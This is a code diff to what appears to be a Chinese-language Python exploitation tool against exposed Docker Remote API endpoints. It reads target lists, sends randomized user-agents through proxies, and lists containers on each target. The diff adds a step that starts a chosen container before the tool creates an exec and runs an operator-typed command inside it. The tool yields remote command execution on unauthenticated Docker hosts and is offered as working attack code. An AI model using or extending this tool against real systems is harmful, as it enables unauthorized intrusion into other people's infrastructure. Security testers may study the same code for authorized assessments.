@@ -34,6 +34,23 @@ def JSON_handle(header1, header2):
     result_json = json.dumps(merged_dict, indent=2)
     return result_json
 
+def start_container(urllist, container_id, proxies):
+    try:
+        start_url = urllist + f"containers/{container_id}/start"
+        response = requests.post(start_url, proxies=proxies)
+        if response.status_code == 204:
+            cprint("\n[+] 成功启动指定ID的容器", "red")
+        elif response.status_code == 404:
+            cprint("[-] 容器ID：" + container_id + " 并不存在，可能是接口被禁", "yellow")
+        elif response.status_code == 403:
+            cprint("[-] 并没有权限启动容器", "yellow")
+        else:
+            cprint("[-] 通过ID运行容器失败，状态码:" + str(response.status_code), "magenta")
+    except RequestException as e:
+        print(f"连接出现异常: {e}")
+        return None
+
+
 def create_exec(urllist, container_id, command, proxies):
     try:
         url = urllist + f"containers/{container_id}/exec"
@@ -49,6 +66,7 @@ def create_exec(urllist, container_id, command, proxies):
             return exec_id
         else:
             cprint("\n[-] 创建执行ID失败，状态码:" + str(response.status_code), "magenta")
+            print(response.text)
             return None
     except RequestException as e:
         print(f"连接出现异常: {e}")
@@ -92,7 +110,8 @@ def url(urllist, proxies, header_new):
                 if (container_id == ""):
                     cprint("[-] 您的输入为空，请输入指定容器ID", "yellow")
                     sys.exit()
-                command = input("[.] 请输入要执行的命令: ")
+                start_container(urllist, container_id, proxies)
+                command = input("\n[.] 请输入要执行的命令(Exit 0状态并不影响): ")
                 if (command == ""):
                     cprint("[-] 您的输入为空，请输入命令", "yellow")
                     sys.exit()
@@ -125,9 +144,9 @@ def file(filename, proxies, header_new):
             if ('://' not in url):
                 url = str("http://") + str(url)
             if str(url[-1]) != "/":
-                u = url + "/containers/json?all=true"
+                u = url + "/containers/json"
             else:
-                u = url + "containers/json?all=true"
+                u = url + "containers/json"
             header = {"User-Agent": random.choice(ua)}
             newheader = json.loads(str(JSON_handle(header, header_new)).replace("'", "\""))
             try:
